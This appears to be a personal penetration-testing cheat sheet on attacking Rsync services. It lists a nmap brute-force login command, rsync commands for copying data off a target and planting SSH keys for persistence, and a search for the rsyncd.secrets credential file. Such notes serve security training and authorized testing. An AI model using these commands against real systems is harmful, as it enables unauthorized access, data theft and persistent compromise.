---
id: Rsync
aliases: []
tags:
  - Networking/Services/Rsync/Exploitation
links: "[[Services]]"
---

<!-- Exploitation {{{-->
# Exploitation

<!-- Outdated Version {{{-->
## Outdated Version

Old versions of Rsync may contain vulnerabilities that can be exploited

> [!tip]
>
> [[Enumeration#Nmap|Identify outdated Rsync version]]
___

<!-- }}} -->

<!-- Misconfigured Modules {{{-->
## Misconfigured Modules

[[Enumeration#Modules|Modules]] without proper authentication
can be accessed by unauthorized users
to read, modify or delete sensitive data

> [!tip]
>
> If a module is writeable, a malicious file can be uploaded,
> potentially leading to remote command execution
> or pivoting into the network

___

<!-- }}} -->

<!-- Brute Force {{{-->
## Brute Force

Brute force Rsync login with [[Nmap]]

> [!example]-
>
> ```sh
> nmap -sV \
>   --script rsync-brute
>   --script-args userdb=/var/<usernames.txt>,passdb=/var/<passwords.txt> \
>   -p 873 \
>   <target>
> ```

___

<!-- }}} -->

<!-- }}} -->

<!-- Post-Exploitation {{{-->
# Post-Exploitation

<!-- Data Exfiltration {{{-->
## Data Exfiltration

Data Exfiltration

```sh
rsync -avz target_host::module_name /local/directory/
```

<!-- }}} -->

<!-- Presistence {{{-->
## Presistence

Gain Persistent Access

```sh
rsync -av home_user/.ssh/ rsync://user@target_host/home_user/.ssh
```

___

<!-- }}} -->

<!-- Config File {{{-->
## Config File

Locate the Rsyncd configuration file

```sh
find /etc \( -name rsyncd.conf -o -name rsyncd.secrets \)
```

> [!tip]
>
> In `rsyncd.conf` the `secrets` file parameter might point to a file
> containing usernames and passwords for rsyncd authentication

___

<!-- }}} -->

<!-- }}} -->
